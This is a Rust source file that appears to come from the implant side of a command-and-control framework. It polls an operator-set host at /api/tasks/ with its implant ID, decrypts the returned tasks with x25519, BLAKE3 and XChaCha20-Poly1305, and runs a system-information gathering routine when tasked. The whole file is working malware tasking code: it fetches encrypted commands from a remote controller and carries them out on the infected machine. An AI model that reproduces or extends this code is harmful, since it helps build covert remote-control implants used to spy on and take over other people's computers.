use arrayvec::ArrayVec;
use base64;
use bincode;
use reqwest;
use std::process;
use std::str::FromStr;
use x25519_dalek::{PublicKey, StaticSecret};

use crate::models::task;
use crate::tasks::system;
use crate::utils::network_encryption;
use crate::{errors::ImplantError, HOST, PORT, PROTOCOL};

const CHECK_IMPLANT_TASKS_ENDPOINT: &str = "/api/tasks/";

pub fn handle_available_tasks(
    implant_id: &String,
    private_key: &StaticSecret,
    base64_server_public_key: &String,
) -> Result<(), ImplantError> {
    let base64_response = get_tasks(&implant_id)?;
    let mut base64_response_lines = base64_response.lines();

    // Using unwrap is safe here, because we control the response from server
    // and it is known to the creator
    let base64_encrypted_tasks = base64_response_lines.next().unwrap();
    let base64_nonce = base64_response_lines.next().unwrap();

    // Convert and decrypt tasks response
    // Base64 decode
    let available_tasks_encrypted = base64::decode(base64_encrypted_tasks)?;

    // Convert public key from base64 to [u8, 32] and nonce from base64 to [u8; 24]
    let server_public_key_vec = base64::decode(base64_server_public_key)?;
    let server_public_key_bytes: ArrayVec<u8, 32> = server_public_key_vec.into_iter().collect();
    let server_public_key_bytes = server_public_key_bytes.into_inner()?;

    let nonce_vec = base64::decode(base64_nonce)?;
    let nonce_bytes: ArrayVec<u8, 24> = nonce_vec.into_iter().collect();
    let nonce_bytes = nonce_bytes.into_inner()?;

    // Generate x25519 shared secret
    let server_public_key = PublicKey::from(server_public_key_bytes);
    let x25519_shared_secret =
        network_encryption::generate_shared_secret(private_key, server_public_key);

    // Generate BLAKE3 hashed key
    let blake3_hashed_key = network_encryption::blake3_hash_key(x25519_shared_secret.as_bytes());

    // Decrypt tasks response
    let decrypted_tasks_response = network_encryption::xchacha20poly1305_decrypt_message(
        blake3_hashed_key,
        available_tasks_encrypted,
        nonce_bytes,
    );

    // Deserialize tasks response
    let deserialized_tasks: Vec<task::Task> = bincode::deserialize(&decrypted_tasks_response[..])?;

    // Check if tasks response is empty array
    if deserialized_tasks.is_empty() {
        return Ok(());
    }

    for task in deserialized_tasks {
        // Using unwrap is safe here because task is sent from server
        let task = task::Tasks::from_str(task.task.as_str()).unwrap();
        match task {
            task::Tasks::GetInfo => system::gather_system_info(),
            _ => process::exit(1),
        }
    }

    Ok(())
}

pub fn get_tasks(implant_id: &String) -> Result<String, ImplantError> {
    let full_url = format!(
        "{}://{}:{}{}{}",
        PROTOCOL, HOST, PORT, CHECK_IMPLANT_TASKS_ENDPOINT, implant_id
    );

    let response = reqwest::blocking::get(full_url)?.text()?;

    Ok(response)
}
